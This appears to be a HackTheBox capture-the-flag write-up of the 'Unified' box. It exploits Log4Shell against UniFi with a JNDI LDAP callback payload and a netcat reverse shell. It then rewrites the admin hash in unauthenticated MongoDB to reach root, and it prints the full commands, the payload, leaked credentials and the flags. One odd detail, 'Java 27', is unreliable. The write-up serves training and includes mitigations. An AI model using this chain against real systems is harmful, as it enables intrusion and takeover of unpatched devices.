# HTB — Unified

```
 ██╗   ██╗███╗   ██╗██╗███████╗██╗███████╗██████╗ 
 ██║   ██║████╗  ██║██║██╔════╝██║██╔════╝██╔══██╗
 ██║   ██║██╔██╗ ██║██║█████╗  ██║█████╗  ██║  ██║
 ██║   ██║██║╚██╗██║██║██╔══╝  ██║██╔══╝  ██║  ██║
 ╚██████╔╝██║ ╚████║██║██║     ██║███████╗██████╔╝
  ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚══════╝╚═════╝ 
              HackTheBox — Starting Point
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 6789, 8080, 8443, 8843, 8880 (UniFi Network Application)
- [x] Identified UniFi 6.4.54 on HTTPS — confirmed CVE-2021-44228 (Log4Shell) attack surface
- [x] Cloned Log4jUnifi, built rogue-jndi submodule, installed Python requirements
- [x] `python exploit.py` injected JNDI payload into login `username`/`remember` fields
- [x] Reverse shell caught as `unifi` via `nc -lvnp 4444`
- [x] PTY upgrade with `script -qc /bin/bash /dev/null`
- [x] `cat /home/michael/user.txt` → user flag
- [x] `ps aux | grep mongo` → MongoDB on port 27117
- [x] `mongo --port 27117 ace` → `db.admin.find()` → admin `_id` recovered
- [x] `mkpasswd -m sha-512 Password123` → SHA-512 hash generated on attack box
- [x] `db.admin.update(...)` replaced `x_shadow` with new hash
- [x] Logged into UniFi web panel as `administrator:Password123`
- [x] Settings → Site → SSH root credentials leaked: `root:NotACrackablePassword4U2022`
- [x] `ssh root@10.129.35.160` → root shell
- [x] Root flag captured

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port discovery and service fingerprinting |
| Log4jUnifi | Specialized Log4Shell exploit for UniFi Network Application |
| rogue-jndi (via Maven) | Rogue LDAP server for JNDI callback and payload delivery |
| Netcat | Reverse shell listener |
| script -qc | PTY upgrade for interactive shell |
| MongoDB shell | Direct database access for credential manipulation |
| mkpasswd | SHA-512 hash generation for password replacement |
| ssh | Root access with recovered plaintext credentials |

---

## TL;DR

UniFi Network Application 6.4.54 running on port 8443 is vulnerable to Log4Shell (CVE-2021-44228). The login endpoint logs the `username` and `remember` POST parameters without sanitization, so injecting `${jndi:ldap://attacker:1389/o=tomcat}` into both fields triggers a JNDI lookup that fetches and executes a malicious payload from a rogue LDAP server. Shell lands as `unifi`. MongoDB is exposed locally on port 27117 with no authentication — connect, find the administrator's user document, replace the `x_shadow` field with a freshly-generated SHA-512 hash for a known password, then log into the UniFi web panel as `administrator`. The Site settings page exposes plaintext SSH root credentials. SSH in as root.

---

## Introduction

Unified is a HTB Starting Point box built around one of the most impactful vulnerabilities of the last decade: Log4Shell (CVE-2021-44228). UniFi's Network Application runs on Java and logs user-supplied input through Log4j2 — which means anything the login endpoint logs is potentially a code execution vector. The JNDI lookup string `${jndi:ldap://...}` gets interpreted by Log4j before it hits any application logic, which is the kind of design decision that haunts you at 2 AM when the CVE drops.

The escalation from `unifi` to `root` doesn't require any CVE — just the observation that the application's MongoDB backend is running locally with no authentication and stores admin credentials as replaceable SHA-512 hashes. Swap the hash, log in through the web UI, navigate to Site settings, and the box hands you the root SSH password in plaintext. It's almost polite.

---

## Recon

### Port Scan

```bash
rustscan -a 10.129.35.160 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC
```

Six open ports:

| Port | Service | Notes |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 6789/tcp | ibm-db2-admin? | UniFi inform port (device communication) |
| 8080/tcp | HTTP | Apache Tomcat — redirects to `/manage` |
| 8443/tcp | HTTPS | UniFi web interface — `commonName=UniFi`, Ubiquiti Inc. certificate |
| 8843/tcp | HTTPS | UniFi guest portal |
| 8880/tcp | HTTP | UniFi HTTP portal redirect |

The TLS certificate on 8443 is immediately revealing: `commonName=UniFi`, `organizationName=Ubiquiti Inc.` — this is the Ubiquiti UniFi Network Application. The certificate expired in April 2024, which is decorative at this point.

Browsing to `https://10.129.35.160:8443/manage/account/login?redirect=%2Fmanage` confirmed the login portal.

### Vulnerability Research

UniFi Network Application is a Java-based controller. The login endpoint processes user input through Log4j2 for logging purposes. CVE-2021-44228 (Log4Shell) affects Log4j2 versions 2.0-beta9 through 2.15.0 — any input that ends up in a log message can be processed as a lookup expression, and `${jndi:ldap://attacker/payload}` triggers an outbound LDAP connection that fetches and executes attacker-controlled Java code.

UniFi 6.4.54 is within the vulnerable range. The `username` and `remember` POST fields in the login request are both logged — confirmed attack surface.

---

## Foothold

### Setting Up the Exploit Chain

Two components needed: a rogue LDAP server to handle the JNDI callback, and a payload to deliver. The Log4jUnifi tool wraps both into a single Python script with a bundled rogue-jndi Java component.

```bash
mkdir -p ~/htb/unifi-log4shell && cd ~/htb/unifi-log4shell
git clone https://github.com/puzzlepeaches/Log4jUnifi
cd Log4jUnifi
```

The `rogue-jndi` submodule wasn't initialized:

```bash
git submodule update --init --recursive
# Clones https://github.com/veracode-research/rogue-jndi
```

Build the rogue JNDI server JAR (requires Maven and JDK 11):

```bash
sudo pacman -S maven jdk11-openjdk   # was missing on this machine
mvn package -f utils/rogue-jndi/
# BUILD SUCCESS — outputs RogueJndi-1.1.jar
```

Install Python dependencies:

```bash
pip install -r requirements.txt
```

### Why Not JNDI-Exploit-Kit

The first attempt used the generic JNDI-Exploit-Kit. It failed: that tool's gadget chains (Commons Collections, TemplatesImpl) rely on specific library versions in the target classpath, and UniFi's Java 27 runtime with strict module access blocked the `IllegalAccessError` paths. Log4jUnifi is built specifically for UniFi's runtime environment and uses a payload approach that works regardless.

### Injecting the Payload

Started a listener on the attack box:

```bash
nc -lvnp 4444
```

Fired the exploit — the JNDI string goes into both the `username` and `remember` fields of the login JSON body:

```bash
python exploit.py -u https://10.129.35.160:8443 -i 10.10.14.92 -p 4444
```

```
[*] Starting malicious JNDI Server
{"username": "${jndi:ldap://10.10.14.92:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.14.92:1389/o=tomcat}", "strict":true}
[*] Firing payload!
[*] Check for a callback!
```

---

## Shell / Initial Access

```
Listening on 0.0.0.0 4444
Connection received on 10.129.35.160 36042
```

Shell landed. `python` wasn't on the box (`command not found`), so PTY upgrade via the `script` fallback:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

```
unifi@unified:/usr/lib/unifi$
```

Running as the `unifi` service account, inside the UniFi application directory.

---

## Escalation Path

### User Flag

```bash
ls /home
# michael
cat /home/michael/user.txt
```

```
6ced1a6a89e666c0620cdb10262ba127
```

*(First attempt typo: `/home/michiael/` — the box does not share your typos' sense of humor.)*

### MongoDB Discovery

`ss` and `netstat` weren't in PATH, but `ps aux` was:

```bash
ps aux | grep mongo
```

```
unifi  67  ... bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117
               --bind_ip 127.0.0.1
```

MongoDB running locally on port **27117**, bound to loopback only. No `--auth` flag in the process arguments — unauthenticated access.

---

## Exploitation

### MongoDB — Credential Manipulation

Connect to the `ace` database (UniFi's default):

```bash
mongo --port 27117 ace
```

Enumerate admin users:

```javascript
db.admin.find()
```

The `administrator` user document:

```
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
  "name" : "administrator",
  "email" : "administrator@unified.htb",
  "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
  ...
}
```

`x_shadow` is the SHA-512 hashed password. Since SHA-512 can't be cracked quickly, the play is to replace it with a hash for a known password.

On the attack box, generate a SHA-512 hash:

```bash
mkpasswd -m sha-512 Password123
# $6$0Y3rY20e5mnCgb06$BeTJEFYWMmPuHqGNG2HbmPwwLhdvQgjg/FAz4l3mO9X...
```

Back in the MongoDB shell, update the administrator's hash:

```javascript
db.admin.update(
  {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
  {$set: {"x_shadow": "$6$0Y3rY20e5mnCgb06$BeTJEFYWMmPuHqGNG2HbmPwwLhdvQgjg/FAz4l3mO9X.bQC7Rkf3w8OFU.nzfk8wWH8vPzf/uTRuAXBvids2e."}}
)
```

### Web Panel → SSH Root Credentials

Logged into `https://10.129.35.160:8443/manage` as `administrator:Password123`.

Navigated to **Settings → Site**. At the bottom of the page, under the SSH authentication section, plaintext credentials:

```
root : NotACrackablePassword4U2022
```

UniFi stores SSH root credentials for managed devices in plaintext in the Site configuration. Ironic name choice.

### Root Shell

```bash
ssh root@10.129.35.160
# password: NotACrackablePassword4U2022
```

```
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
```

---

## Rabbit Holes

**JNDI-Exploit-Kit:** The first tool tried. Cloned the repo, confirmed the JAR was there, ran it against the target — no callback. The tool's gadget chains depend on specific classpath libraries that UniFi's environment didn't have in the right versions, and Java 27's module restrictions blocked the TemplatesImpl payload path. Wasted about 15 minutes before switching to the UniFi-specific tool.

**`ss` and `netstat` not in PATH:** After landing the shell and trying to enumerate listening ports, `ss` and `netstat` both returned `command not found`. These tools exist on the box but aren't in the `unifi` user's PATH. `ps aux | grep mongo` is always a reliable fallback for finding running database services when network enumeration tools aren't accessible.

**Typo on user flag path:** `/home/michiael/user.txt` vs `/home/michael/user.txt`. `ls /home` would have been the better first move. One character off, two extra commands to correct it.

**Running MongoDB commands outside the shell:** Early in the session, MongoDB JavaScript syntax (`db.admin.update(...)`) was pasted into the bash shell instead of the MongoDB shell. Bash returned `syntax error near unexpected token '{'`. The fix was obvious but required recognizing that the MongoDB client session had to be active before running those commands.

---

## Flag

| Flag | Value |
|---|---|
| User flag | `6ced1a6a89e666c0620cdb10262ba127` |
| Root flag | `e50bc93c75b634e4b272d2f771c33681` |

---

## Mitigations

**Log4Shell (CVE-2021-44228) — Upgrade Log4j2:** The root cause is Log4j2 versions below 2.16.0 processing JNDI lookup expressions from user-controlled input. The fix is to upgrade to Log4j2 ≥ 2.16.0, which removed message lookup substitution entirely. As a temporary mitigation for older versions, setting `log4j2.formatMsgNoLookups=true` or removing the `JndiLookup` class from the classpath disables the vulnerable feature. UniFi Network Application ≥ 6.5.54 addressed this.

**Unauthenticated MongoDB:** The MongoDB instance ran on `127.0.0.1:27117` with no `--auth` flag, allowing any local user (including the `unifi` service account from the shell) to connect and modify any collection. MongoDB should be started with `--auth` enabled, and the UniFi application user should be granted only the minimum necessary database permissions (read/write to `ace`, not the ability to modify admin credentials).

**Plaintext SSH Credentials in Web UI:** The Site settings page exposed `root:NotACrackablePassword4U2022` in plaintext. SSH credentials for managed infrastructure should never be stored in plaintext in an application's web interface. Ubiquiti should use SSH key-based authentication for device management rather than storing passwords that any administrator-level web user can read.

**SHA-512 Without Salt Control:** The `x_shadow` field stored SHA-512 hashes, but the hash replacement attack worked because the database was writable without authentication and the hash could be substituted wholesale. Defense-in-depth would include database authentication (see above) and application-level integrity checks on credential fields, but the real fix is the MongoDB auth issue — without database write access, the hash replacement is impossible.

---

## Key Takeaway

Log4Shell is the cleanest example of why logging user-controlled input without sanitization is dangerous: the exploit isn't in the application logic, it's in the logging framework processing the data before the application even sees it. The JNDI lookup fires at the log statement — the rest of the application's input validation, authentication checks, and business logic all happen after the RCE has already occurred. There's no patch to the application that fixes this; it requires upgrading the library.

The escalation path reinforces the principle of least privilege for service accounts. The `unifi` OS user could connect to MongoDB and rewrite admin credentials because MongoDB had no authentication requirement. A properly configured environment would have MongoDB require authentication, the UniFi service account would have only the permissions it needs for application operation, and the SSH root credentials would never be stored in a plaintext-readable field in the application's web UI. Any one of those three controls breaks the escalation chain.

---

## If I Did It Again

I'd skip JNDI-Exploit-Kit entirely and go straight to Log4jUnifi. When the target is a specific known-vulnerable application (UniFi), a tool built for that application beats a generic one. The generic tool's gadget chains are a compatibility gamble; the specialized tool handles the environment specifics for you.

For the MongoDB step — `ps aux | grep mongo` or `ps aux | grep 27` to find the port before even trying `ss` or `netstat`. Service processes listed in `ps` give you port numbers directly from their command-line arguments, and `ps` is almost always in PATH even when network tools aren't.

The typo on the username path (`michiael` vs `michael`) is embarrassing in retrospect. `ls /home` takes two seconds and should always be the first step before guessing home directory names. Lesson noted, probably not learned permanently.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-10-19 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
